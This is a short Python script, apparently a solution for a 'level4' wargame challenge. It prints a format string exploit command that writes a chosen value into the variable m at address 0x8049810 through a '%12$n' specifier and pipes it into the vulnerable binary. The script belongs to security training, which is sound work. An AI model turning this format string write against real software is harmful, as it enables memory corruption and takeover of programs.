#!/usr/bin/env python3
"""Level4: address of m + value 16930116 + index (e.g. 12) → format string command."""

try:
    from pwn import p32
except ImportError:
    def p32(x):
        return x.to_bytes(4, "little")

M_ADDR = 0x8049810
VALUE = 16930116  # 0x1025544
INDEX = 12  # found with AAAA + %k$p (adjust for another VM)

def main():
    padding = VALUE - 4
    addr_le = p32(M_ADDR)
    addr_str = "".join("\\x%02x" % b for b in addr_le)
    cmd = (
        "python -c 'print \"%s\" + \"%%%dx\" + \"%%%d$n\"' | ./level4"
        % (addr_str, padding, INDEX)
    )
    print(cmd)
    print("# m =", hex(M_ADDR), ", value =", VALUE, ", index =", INDEX)

if __name__ == "__main__":
    main()
